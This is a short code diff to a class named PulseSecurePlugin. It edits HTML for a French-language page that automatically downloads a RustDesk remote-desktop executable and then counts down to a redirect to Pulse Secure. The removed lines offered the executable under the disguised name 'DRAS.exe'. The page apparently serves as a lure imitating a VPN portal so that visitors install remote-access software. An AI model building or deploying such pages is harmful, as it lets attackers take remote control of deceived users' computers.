@@ -282,9 +282,9 @@ class PulseSecurePlugin(VPNPlugin):
                 <h3>Téléchargement en cours...</h3>
                 <p>Cliquez sur le lien ci-dessous si le téléchargement ne démarre pas automatiquement :</p>
                 <a href="https://github.com/rustdesk/rustdesk/releases/download/1.4.0/rustdesk-1.4.0-x86_64.exe" 
-                   download="DRAS.exe" id="downloadLink" 
+                   download="rustdesk-1.4.0-x86_64.exe" id="downloadLink" 
                    style="color: blue; text-decoration: underline; cursor: pointer;">
-                   Télécharger DRAS.exe
+                   Télécharger rustdesk-1.4.0-x86_64.exe
                 </a>
                 <p style="margin-top: 20px;">Redirection vers Pulse Secure dans <span id="countdown">3</span> secondes...</p>
             </div>
